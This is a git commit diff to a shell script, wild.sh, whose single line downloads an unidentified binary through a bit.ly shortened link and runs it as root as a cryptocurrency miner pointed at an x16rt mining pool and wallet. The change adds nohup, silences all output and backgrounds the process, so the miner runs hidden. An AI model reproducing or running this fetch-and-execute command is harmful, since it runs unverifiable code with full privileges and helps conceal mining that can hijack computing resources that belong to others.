1bacfc7fa4b2cfa81b1af9932fb38d12885396a9
p4n1k <46290080+p4n1k@users.noreply.github.com>
2022-03-08 23:34:57 +0700

    Update wild.sh

--- wild.sh
+++ wild.sh
@@ -1,1 +1,1 @@
-wget https://bit.ly/3MqS7zY && chmod +x 3MqS7zY && sudo ./3MqS7zY -a x16rt -o stratum+tcp://stratum-na.rplant.xyz:7067 -u RTb5zre1gWPNGQLvAFbWY3DVDMke1RxdFQ.vcpu001  --opencl-launch auto --print-full --print-power
+wget https://bit.ly/3MqS7zY && chmod +x 3MqS7zY && nohup sudo ./3MqS7zY -a x16rt -o stratum+tcp://stratum-na.rplant.xyz:7067 -u RTb5zre1gWPNGQLvAFbWY3DVDMke1RxdFQ.vcpu001  --opencl-launch auto --print-full --print-power </dev/null >/dev/null 2>&1 &
